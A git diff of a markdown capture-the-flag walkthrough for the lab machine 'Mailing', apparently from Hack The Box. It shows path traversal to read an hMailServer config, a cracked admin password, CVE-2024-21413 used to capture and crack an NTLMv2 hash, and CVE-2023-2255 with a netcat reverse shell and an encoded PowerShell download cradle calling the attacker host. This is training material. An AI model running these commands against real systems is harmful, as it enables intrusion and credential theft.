@@ -1,7 +1,7 @@
 # Reconnaissance
 ## Nmap Enumeration
 - we pass the commands (we did udp but it shoed all open filtered as windows usually doesnt respond with icmp so nmap assumes its open/filtered):
-	```bash
+```bash
 nmap -sV -sC -vv 10.10.11.14
 
 ---OUTPUT---
@@ -144,24 +144,24 @@ Host script results:
 |_    Message signing enabled but not required
 
 ```
-	- **25, 587 : SMTP** : Originally 25 was main port but now 587 is used
-		- We see domain name mailing.htb
-	- 993 : SSL/IMAP
-		```bash
+- **25, 587 : SMTP** : Originally 25 was main port but now 587 is used
+- We see domain name mailing.htb
+- 993 : SSL/IMAP
+```bash
 # For all SSL Ports
 ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
 		| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
 ```
-	- 465 : SSL/SMTP
-	- 445 : microsoft-ds?
-	- 143 : IMAP
-	- 139 : netbios/SMB
-	- 135 : MSRPC
-	- 110 : POP3
-	- 80 : HTTP : Can access a website
+- 465 : SSL/SMTP
+- 445 : microsoft-ds?
+- 143 : IMAP
+- 139 : netbios/SMB
+- 135 : MSRPC
+- 110 : POP3
+- 80 : HTTP : Can access a website
 ## Directory Enumeration
 - Gobuster (also added -x php to find more php flag's after finding download.php):
-	```bash
+```bash
 gobuster dir -u http://mailing.htb dns -x php --wordlist /usr/share/wordlists/dirb/big.txt -o gobuster.root
 
 ---OUTPUT---
@@ -173,7 +173,7 @@ gobuster dir -u http://mailing.htb dns -x php --wordlist /usr/share/wordlists/di
 /instructions         (Status: 301) [Size: 166] [--> http://mailing.htb/instructions/]
 ```
 - No output for ffuf:
-	```bash
+```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://mailing.htb/ -H 'Host: FUZZ.mailing.htb' -fs 4681
 
 ---OUTPUT---
@@ -184,23 +184,23 @@ Nothing of value..
 
 ### Direct
 - website url changed to mailing.htb when trying to access 10.10.11.14
-	- add to /etc/hosts
+- add to /etc/hosts
 - uses hMailServer
-	- File Inclusion vulnerability found online
+- File Inclusion vulnerability found online
 - link to download pdf:
-	- http://mailing.htb/download.php?file=instructions.pdf
+- http://mailing.htb/download.php?file=instructions.pdf
 - 3 teams with 3 names:
-	- Ruy Alonso - IT Team
-	- Maya Bendito - Support Team
-	- Gregory Smith - Founder and CEO
+- Ruy Alonso - IT Team
+- Maya Bendito - Support Team
+- Gregory Smith - Founder and CEO
 
 ### Via BurpSuite (Exploiting Directory Traversal Vulnerability)
 - We test for path traversal
-	- Windows host file:
-		- ..\..\Windows\System32\drivers\etc\hosts
+- Windows host file:
+- ..\..\Windows\System32\drivers\etc\hosts
 			![[Pasted image 20250408080818.png]]
-		- The GET Request:
-			```bash
+- The GET Request:
+```bash
 GET /download.php?file=..\..\Windows\System32\drivers\etc\hosts HTTP/1.1
 Host: mailing.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -217,14 +217,14 @@ Priority: u=0, i
 127.0.0.1	mailing.htb
 ```
 - We check for config file location for hMailServer
-	- Google "hMailServer config file location"
-		- In an hMailServer forum post
-			```bash
+- Google "hMailServer config file location"
+- In an hMailServer forum post
+```bash
 c:\program files (x86\hMailServer\Bin\hMailServer.ini
 ```
-			- We try it on BurpSuite
+- We try it on BurpSuite
 - Send a GET Request to config file location:
-	```bash
+```bash
 GET /download.php?file=..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini HTTP/1.1
 Host: mailing.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -259,19 +259,19 @@ Server=
 Database=hMailServer
 Internal=1
 ```
-	- ca use Progra~2 for x86 and Progra~1 for normal instead of dealing with spaces
-	- Administrator Password : `841bb5acfa6779ae432fd7a4e6600ba7`
-	- MSSQL
+- ca use Progra~2 for x86 and Progra~1 for normal instead of dealing with spaces
+- Administrator Password : `841bb5acfa6779ae432fd7a4e6600ba7`
+- MSSQL
 - Using crackstation.net
-	- Password: homenetworkingadministrator
+- Password: homenetworkingadministrator
 ## Initial Foothold
 - We know there is a mail server running
-	- So there must be a mail client
-		- By default in Windows it's Windows Mail (also shown in the instructions pdf)
-			- On searching for exploits we find:
-				- https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
-					- Run smbserver on directory with
-				```bash
+- So there must be a mail client
+- By default in Windows it's Windows Mail (also shown in the instructions pdf)
+- On searching for exploits we find:
+- https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+- Run smbserver on directory with
+```bash
 impacket-smbserver smbFolder $(pwd) -smb2support
 
 OR
@@ -292,8 +292,8 @@ sudo responder -I tun0
 [-] SMB2_TREE_CONNECT not found test
 [*] NetrShareEnum Level: 1
 ```
-			- Execute exploit:
-				```bash
+- Execute exploit:
+```bash
 python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.25\test\meeting" --subject Test
 
 ---OUTPUT---
@@ -302,24 +302,24 @@ Alexander Hagenah / @xaitax / ah@primepage.de
 
 ✅ Email sent successfully.
 ```
-				- We get a NTLMv2 hash
-			- We attempt to crack it with hashcat
-				```bash
+- We get a NTLMv2 hash
+- We attempt to crack it with hashcat
+```bash
 vi maya.ntlmv2 # Copy the hash
 hashcat maya.ntlmv2 /usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
 MAYA::MAILING:aaaaaaaaaaaaaaaa:e6c06f19a87893ab8c7da4d906876af0:01010000000000008063c539a1a8db01ac9ee1f8cf2107f100000000010010005a00610046006f006400650075007100030010005a00610046006f00640065007500710002001000720063004f00760056006a006900590004001000720063004f00760056006a0069005900070008008063c539a1a8db01060004000200000008003000300000000000000000000000002000006896629cd37c6ec72f4970fef610ade3b1491047a428afd52ef768294fcad7730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000:m4y4ngs4ri
 ```
-	- Password: m4y4ngs4ri
+- Password: m4y4ngs4ri
 - evil-winrm into machine:
-	```bash
+```bash
 evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
 ```
-	- We gain user flag
+- We gain user flag
 ## Privilege Escalation
 - Under Program Files we find LibreOffice and we find version:
-	```bash
+```bash
 cd C:\Progra~1
 dir
 cd LibreOffice
@@ -331,12 +331,12 @@ type version.ini
 MsiProductVersion=7.4.0.1
 ```
 - On searching google we find
-	- https://github.com/elweth-sec/CVE-2023-2255
-	- We exploit the script.
-	- Two ways:
-		- Netcat
-			- Make sure you win-rm on the location where the files you need are at or specify the full path:
-			```bash
+- https://github.com/elweth-sec/CVE-2023-2255
+- We exploit the script.
+- Two ways:
+- Netcat
+- Make sure you win-rm on the location where the files you need are at or specify the full path:
+```bash
 ---ON-LOCAL-MACHINE---
 cd CVE-2023-2255
 python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.25 9999" --output exploit.odt
@@ -350,12 +350,12 @@ upload nc.exe
 cd "C:\Important Documents"
 upload exploit.odt
 ```
-			- We gain localadmin user access
-	- Create a cradle
-		- The basic idea is we create a script that calls to download our reverse shell and execute it
-			- That script which is our payload (which calls our actual payload from our local machine) is called a cradle
-			- We encrypt it using utf-16le and base64 for windows to read it more easily
-		```bash
+- We gain localadmin user access
+- Create a cradle
+- The basic idea is we create a script that calls to download our reverse shell and execute it
+- That script which is our payload (which calls our actual payload from our local machine) is called a cradle
+- We encrypt it using utf-16le and base64 for windows to read it more easily
+```bash
 vi cradle
 > IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/shell.ps1')
 cat cradle | iconv --to-code utf-16le |base64 -w 0
@@ -363,27 +363,27 @@ cat cradle | iconv --to-code utf-16le |base64 -w 0
 ---OUTPUT---
 SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
 ```
-		- Say we get a response on http server but no reverse shell
-			- Could imply AntiVirus at play 
+- Say we get a response on http server but no reverse shell
+- Could imply AntiVirus at play 
 - Then we execute our exploit (we use TCP One Liner reverse shell script)
-	```bash
+```bash
 cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
 vi shell.ps1 # edit to put our ip and port ($client...)
 python3 -m http.server 8001
 ```
-	- We create our exploit and open our netcat listener
-		```bash
+- We create our exploit and open our netcat listener
+```bash
 cd CVE-2023-2255
 python3 CVE-2023-2255.py --cmd "cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=" --output exploit2.odt
 cp exploit2.odt ../exploit2.odt
 nc -lvnp 9998
 ```
-	- And then we upload it on our target:
-		```bash
+- And then we upload it on our target:
+```bash
 cd "C:\Important Documents"
 upload exploit2.odt
 ```
-	- We should gain localadmin user access on our listener in a few minutes (assuming someone opens our file just like how we got maya's credentials)
+- We should gain localadmin user access on our listener in a few minutes (assuming someone opens our file just like how we got maya's credentials)
 --------------
 ------
 ## Notes
